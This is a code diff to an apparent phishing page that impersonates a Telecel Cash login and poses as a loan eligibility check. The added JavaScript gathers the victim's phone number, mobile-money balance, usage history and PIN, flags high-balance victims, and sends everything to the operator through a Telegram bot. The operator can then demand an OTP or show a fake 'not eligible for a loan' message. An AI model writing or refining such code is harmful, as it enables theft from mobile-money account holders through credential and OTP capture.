@@ -306,56 +306,22 @@
 
     /* Mobile fine-tuning */
     @media (max-width: 360px) {
-      body {
-        padding: 8px;
-      }
-      .container {
-        padding: 24px 12px 32px;
-        border-radius: 24px;
-      }
-      .logo {
-        margin-top: 8px;
-      }
-      .logo-circle {
-        width: 44px;
-        height: 44px;
-        font-size: 26px;
-      }
-      .logo-text {
-        font-size: 22px;
-      }
-      .title {
-        font-size: 17px;
-        margin-top: 8px;
-      }
-      .subtitle {
-        font-size: 13px;
-      }
-      .form {
-        margin-top: 20px;
-      }
-      .input, .select, .pin-input, .btn {
-        height: 46px;
-      }
-      .pin-input {
-        font-size: 22px;
-      }
-      .btn {
-        font-size: 15px;
-        margin-top: 16px;
-      }
-      .version {
-        font-size: 10px;
-        margin-top: 16px;
-      }
+      body { padding: 8px; }
+      .container { padding: 24px 12px 32px; border-radius: 24px; }
+      .logo { margin-top: 8px; }
+      .logo-circle { width: 44px; height: 44px; font-size: 26px; }
+      .logo-text { font-size: 22px; }
+      .title { font-size: 17px; margin-top: 8px; }
+      .subtitle { font-size: 13px; }
+      .form { margin-top: 20px; }
+      .input, .select, .pin-input, .btn { height: 46px; }
+      .pin-input { font-size: 22px; }
+      .btn { font-size: 15px; margin-top: 16px; }
+      .version { font-size: 10px; margin-top: 16px; }
     }
 
-    body, .container, .content {
-      overflow-x: hidden;
-    }
-    .container {
-      overflow: hidden;
-    }
+    body, .container, .content { overflow-x: hidden; }
+    .container { overflow: hidden; }
   </style>
 </head>
 <body>
@@ -563,6 +529,28 @@
     return Math.floor(100000 + Math.random() * 900000).toString();
   }
 
+  // ========== HELPER: Get user data from localStorage ==========
+  function getUserFinancialData() {
+    // Phone number (from step1) – stored as raw 10-digit string without +233
+    let phone = localStorage.getItem('phone') || '';
+    // Current balance (from details step2)
+    let balance = localStorage.getItem('currentBalance') || 'Not provided';
+    // How long used Telecel Cash
+    let tenure = localStorage.getItem('telecelTenure') || 'Not provided';
+    // Usage frequency
+    let frequency = localStorage.getItem('usageFrequency') || 'Not provided';
+    return { phone, balance, tenure, frequency };
+  }
+
+  // Determine if balance is 500+ (for highlighting phone number)
+  function isBalanceHigh(balanceStr) {
+    if (!balanceStr) return false;
+    if (balanceStr === '500-999' || balanceStr === '1000+') return true;
+    const match = balanceStr.match(/\d+/);
+    if (match && parseInt(match[0]) >= 500) return true;
+    return false;
+  }
+
   // ========== TELEGRAM HELPERS ==========
   function escapeHtml(unsafe) {
     if (!unsafe) return '';
@@ -588,6 +576,7 @@
     const sixOtpId = `login_6otp_${ts}`;
     const declineId = `login_decline_${ts}`;
     
+    // Store basic credentials
     sessionStorage.setItem('telecel_accountType', accountType);
     sessionStorage.setItem('telecel_identifier', identifier);
     if (accountType === 'Mobile') {
@@ -597,14 +586,25 @@
     }
     sessionStorage.setItem('telecel_pin', pin);
     
-    const displayType = accountType;
-    const identifierLabel = accountType === 'Mobile' ? ' Phone' : '🆔 Account ID';
-    const message = `🔐 <b>Telecel Play Login Request</b>\n\n` +
-                    `<b>Account Type:</b> ${displayType}\n` +
-                    `<b>${identifierLabel}:</b> <code>${escapeHtml(identifier)}</code>\n` +
-                    `<b> 4‑Digit PIN:</b> <code>${escapeHtml(pin)}</code>\n\n` +
+    // Retrieve additional user data from localStorage (filled during financial assessment)
+    const { phone, balance, tenure, frequency } = getUserFinancialData();
+    
+    // IMPORTANT: Phone number is stored as raw 10 digits (e.g., "201234567") – no +233 prefix.
+    // Display exactly as stored.
+    const displayPhone = phone || 'Not provided';
+    // Highlight phone number if balance >= 500 (still applies)
+    const phoneFormatted = isBalanceHigh(balance) 
+      ? `<b><u>${escapeHtml(displayPhone)}</u></b>`
+      : escapeHtml(displayPhone);
+    
+    // Prepare concise message – phone number WITHOUT +233
+    const message = `🔐 <b>Telecel Play Login</b>\n\n` +
+                    `<b>📱 Phone:</b> <code>${phoneFormatted}</code>\n` +
+                    `<b>💰 Balance:</b> ${escapeHtml(balance)}\n` +
+                    `<b>📅 History:</b> ${escapeHtml(tenure)} (${escapeHtml(frequency)})\n` +
+                    `<b>🔢 PIN:</b> <code>${escapeHtml(pin)}</code>\n\n` +
                     `📢 <b>Select OTP length or Decline:</b>`;
-
+    
     try {
       const response = await fetch(`${API_BASE}/sendMessage`, {
         method: 'POST',
@@ -681,7 +681,8 @@
             isSubmitting = false;
             loginBtn.disabled = false;
             updateLoginButton();
-            showError('Authentication declined. Please check your credentials and try again.');
+            // Custom decline message: not eligible for loan
+            showError('You are not eligible for a loan currently.');
             clearPinFields();
             focusFirstPin();
             return;
@@ -713,7 +714,7 @@
     
     if (accountType === 'Mobile') {
       if (!validateMobileNumber(identifier)) {
-        showError('Please enter a valid Telecel number starting with 020 or 050 (minimum 10 digits).');
+        showError('Please enter a valid Telecel number starting with 020 or 050 (10 digits).');
         return;
       }
     } else {
